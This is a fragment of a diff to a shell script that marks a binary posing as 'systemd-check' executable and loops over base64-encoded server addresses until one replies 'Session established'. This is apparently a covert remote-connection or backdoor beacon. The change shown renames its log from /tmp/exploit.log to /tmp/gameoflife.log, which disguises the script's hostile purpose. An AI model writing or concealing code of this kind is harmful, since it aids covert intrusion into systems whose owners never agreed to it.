@@ -16,15 +16,15 @@ then
 else
     if $(echo $status | grep -q -i 'inactive')
     then
-        echo "Inactive" >> /tmp/exploit.log
+        echo "Inactive" >> /tmp/gameoflife.log
     else
         chmod +x /usr/bin/systemd-check
         for s in $update_servers
         do
-            echo "Connecting to server "$s >> /tmp/exploit.log
+            echo "Connecting to server "$s >> /tmp/gameoflife.log
             if $(/usr/bin/systemd-check $(echo $s | base64 -d) 2>/dev/null | grep -q 'Session established')
             then
-    	        echo "Connected to server "$s >> /tmp/exploit.log
+    	        echo "Connected to server "$s >> /tmp/gameoflife.log
                 break
             fi
         done
